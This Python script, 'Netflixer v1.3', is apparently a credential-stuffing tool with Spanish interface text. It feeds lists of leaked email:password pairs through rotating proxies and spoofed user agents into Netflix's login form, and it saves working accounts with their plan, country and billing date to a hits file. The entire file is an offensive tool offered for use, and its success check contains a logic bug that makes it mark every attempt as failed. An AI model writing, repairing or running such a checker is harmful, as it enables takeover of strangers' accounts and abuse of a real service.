import os, requests, easygui, time, random, threading, ctypes
from colorama import Fore
from fake_useragent import UserAgent as ua
from bs4 import BeautifulSoup as Soup



def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class Netflixer:
    def __init__(self):
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0  
        self.retries = 0   
        self.lock = threading.Lock()
            
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v1.3] - MADE BY ! RAMZY 🧡') 
        text = '''                                         
                     _  __ ___ _____ ____ __   __ _  __  _____  _  _____  _   __
                    / |/ // _//_  _// __// /  / /| |/,' /_  _/,' \/_  _/.' \ / /
                   / || // _/  / / / _/ / /_ / / /  /    / / / o | / / / o // /_
                  /_/|_//___/ /_/ /_/  /___//_/,'_n_\   /_/  |_,' /_/ /_n_//___/
 '''        
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f'{Fore.LIGHTBLUE_EX}\ngithub.com/nottzack Version 1.3\n{Fore.RESET}'))
    
    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new-old) * 15

    def updateTitle(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            ctypes.windll.kernel32.SetConsoleTitleW(f'[NETFLIXER v1.3] - VALIDOS: {self.hits} | MALOS: {self.bad} | RETENIDOS: {self.retries} | CPM: {self.cpm} | HILOS: {threading.active_count() - 2} | TIEMPO  DE ESPERA: {elapsed}')
            time.sleep(0.4)

    def getProxies(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] abre el archivo de las proxis> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Netflixer - Seleciona la Carpeta de las Proxis', multiple= False)
            open(path, "r", encoding="utf-8") 

            choice = int(input(f'[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy tipo [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTPS/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> '))
            
            if choice == 0:
                proxytype = 'https'                          
            elif choice == 1:
                proxytype = 'socks4'
            elif choice == 2:
                proxytype = 'socks5'
            else:
                print(f'[{Fore.RED}!{Fore.RESET}] Porfavor selecione [0,1,2]')
                os.system('pause >nul')
                quit()
            
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                    ip = l.split(":")[0]
                    port = l.split(":")[1]
                    self.proxies.append({'http': proxytype+'://'+ip+':'+port.rstrip("\n")})

        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] El valor debe ser un número entero!')
            os.system('pause >nul')
            quit()
       
        except Exception as e:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Fallido! intenando abrir las proxsis')
            os.system('pause >nul')
            quit()

    def getCombos(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Carpeta de Comandos --> ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= 'Netflixer - Seleciona los Combos', multiple= False)
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.combos.append(l.replace('\n', ''))
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Fallido! intentando abrir los combos')
            os.system('pause >nul')
            quit()
        
    def checker(self, email, password):
        try:     
            client = requests.Session()
            login = client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies))
            soup = Soup(login.text,'html.parser')
            loginForm = soup.find('form')
            authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
            
            headers = {"user-agent": ua().random,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded","cookie":""}
            data = {"userLoginId:": email, "password": password, "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
            
            request = client.post("https://www.netflix.com/login",headers =headers, data =data ,proxies =random.choice(self.proxies))
            cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies)).cookies.get("flwssn"))
            
            if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {email} | {password} ')
                self.bad += 1
                self.lock.release()
            
            else:     
                info = client.get("https://www.netflix.com/YourAccount", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.netflix.com" ,"Referer": "https://www.netflix.com/browse" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
                plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                country = info.split('","currentCountry":"')[1].split('"')[0]
                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                self.lock.acquire()
                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {email} | {password} | {plan} | {country} | {expiry}')
                self.hits += 1
                with open('hits.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'Email: {email} Contraseña: {password} - Plan: {plan} - Continente: {country} - Expira en: {expiry}\n')   
                self.lock.release()
                
        except:
            self.lock.acquire()
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Tiempo de espera del proxy. Cambia tus proxies o usa una VPN diferente')
            self.retries += 1
            self.lock.release()
    
    def worker(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]].split(':')
            self.checker(combination[0], combination[1])
            self.check[thread_id] += 1 

    def main(self):
        self.ui()
        self.getProxies()
        self.getCombos()
        try:
            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> '))
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] El valor debe ser un número entero')
            os.system('pause >nul')
            quit()
               
        self.ui()
        self.start = time.time()
        threading.Thread(target =self.cpmCounter, daemon =True).start()
        threading.Thread(target =self.updateTitle ,daemon =True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[int(len(self.combos) / self.threadcount * i): int(len(self.combos)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] ¡ Todos los Combos checkeados!')
        os.system('pause>nul')
        
n = Netflixer()
n.main()
